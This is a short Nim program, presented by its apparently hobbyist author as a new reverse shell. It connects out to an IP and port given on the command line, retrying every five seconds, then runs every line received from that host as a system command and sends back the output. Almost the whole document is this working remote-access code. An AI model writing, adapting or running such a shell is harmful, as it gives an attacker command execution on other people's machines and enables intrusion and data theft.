### Nim is cool
### Plus it's a new language for me which I never used before, I love it.
### I'm trying out everything, so I decided to upload MY NEW (never done by anyone before xD) reverse shell.

import net
import os
import osproc
import strutils

var ip: string
var port: int

var args = commandLineParams()
if args.len() != 2:
    echo "Usage: revshell [ip] [port]"
    system.quit(2)
else:
    ip = args[0]
    port = parseInt(args[1])

var socket = newSocket()
echo "I am working boss.. [o_0]"

while true:
    try:
        socket.connect(ip, Port(port))
        
        while true:

            try:
                socket.send("NimSHELL> ")
                var input = socket.recvLine()
                var command = execProcess(input)
                socket.send(command)
            except:
                echo "My job's done! Quitting... "
                socket.close()
                system.quit(2)
    
    except:
        echo "Failed to connect, retrying in 5 seconds [?]"
        sleep(5000)
        continue
